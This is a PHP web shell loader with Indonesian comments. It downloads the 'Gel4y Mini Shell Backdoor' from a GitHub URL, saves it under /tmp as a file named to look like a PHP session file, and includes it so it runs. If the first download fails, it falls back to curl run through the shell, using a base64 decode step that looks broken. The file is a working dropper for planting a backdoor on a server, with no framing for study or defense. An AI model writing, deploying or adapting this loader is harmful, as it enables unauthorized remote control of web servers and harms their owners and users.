<?php
$URL = 'https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php'; # bisa kalian ganti
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # Jangan Edit bangian sini kalo ndak mau error

function M() {
	$FGT = @file_get_contents($GLOBALS['URL']);
	if(!$FGT) {
		echo `curl -k $(echo {$GLOBALS['URL']} | base64 -d) > {$GLOBALS['TMP']}`;
	} else {
		$HANDLE = fopen($GLOBALS['TMP'], 'w');
		fwrite($HANDLE, $FGT);
		fclose($HANDLE);
	}
	echo '<script>window.location="?m1n3";</script>';
}

if(file_exists($TMP)) {
	if(filesize($TMP) === 0) {
		unlink($TMP);
		M();
	} else {
		include($TMP);
	}
} else {
	M();
}
?>
